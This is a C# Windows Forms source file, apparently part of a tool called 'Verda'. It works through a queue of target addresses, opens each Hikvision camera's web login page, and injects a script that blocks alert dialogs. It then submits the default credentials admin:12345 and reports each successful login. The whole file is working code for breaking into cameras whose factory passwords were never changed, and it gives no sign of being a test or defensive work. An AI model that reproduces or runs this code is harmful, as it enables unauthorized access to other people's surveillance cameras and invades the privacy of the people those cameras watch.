using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace Verda
{
    public partial class CameraLogin : Form
    {
        string line;
        string currtarget;
        string typeline;
        string targets;
        string types;
        bool onCheckin;

        public CameraLogin()
        {
            InitializeComponent();
        }

        private void CameraHikvisionLogin_Load(object sender, EventArgs e)
        {
            Program.CamTargets = 0;
        }

        public void AddToCheckQueue(string target, string type)
        {

            Program.CamTargets++;
            targets += target + System.Environment.NewLine;
            types += type + System.Environment.NewLine;

            if (onCheckin == false) Check();
        }

        public void Check()
        {

            onCheckin = true;
            using (StringReader reader = new StringReader(targets))
            {
                if ((line = reader.ReadLine()) != null)
                {
                    //webBrowser1.DocumentCompleted += webBrowser1_DocumentCompleted;
                    //webBrowser1.Navigated += webBrowser1_Navigated;
                    currtarget = line;
                    StringReader reader2 = new StringReader(types);
                    typeline = reader2.ReadLine();
                    targets = targets.Remove(0, targets.IndexOf(Environment.NewLine) + 2);
                    types = types.Remove(0, types.IndexOf(Environment.NewLine) + 2);

                    timeout.Tick += timeout_Tick; //?????????

                    if (typeline == "hikvision") webBrowser1.Navigate("http://" + currtarget + "/doc/page/login.asp");
                    //
                }
                else onCheckin = false;
            }
        }

        private void timeout_Tick(object sender, EventArgs e)
        {
            timeout.Tick -= timeout_Tick;  //?????????
            Program.VerdaPost(currtarget + " - Login failed/timeout :(");
            Program.CamTargets--;
            //web.Dispose();
            timeout.Stop();
            webBrowser1.Stop();
            onCheckin = false;
            Check();
            //Application.ExitThread();
        }



        private void webBrowser1_DocumentCompleted_1(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            timeout.Stop();
            timeout.Start();
            if (typeline == "hikvision" & webBrowser1.Url.ToString().Contains("/doc/page/login.asp"))
            {
                HtmlElement head = webBrowser1.Document.GetElementsByTagName("head")[0];
                HtmlElement scriptEl = webBrowser1.Document.CreateElement("script");
                string alertBlocker = "window.alert = function () { }";
                scriptEl.SetAttribute("text", alertBlocker);
                head.AppendChild(scriptEl);

                //webBrowser1.DocumentCompleted -= webBrowser1_DocumentCompleted;
                //webBrowser1.Navigated += webBrowser1_Navigated;

                webBrowser1.Document.GetElementById("loginUserName").InnerText = "admin";
                webBrowser1.Document.GetElementById("loginPassword").InnerText = "12345";
                webBrowser1.Document.InvokeScript("doLogin");
            }
        }

        private void webBrowser1_Navigated_1(object sender, WebBrowserNavigatedEventArgs e)
        {
            timeout.Stop();
            timeout.Start();
            //webBrowser1.Navigated -= webBrowser1_Navigated;
            if (typeline == "hikvision" & webBrowser1.Url.ToString().Contains("/doc/page/main.asp"))
            {
                Program.VerdaPost(currtarget + " - Successful login!!! admin:12345");
                timeout.Stop();
                timeout.Tick -= timeout_Tick;  //?????????
                webBrowser1.Stop();
                Program.CamTargets--;
                onCheckin = false;
                Check();
            }
        }
    }
}
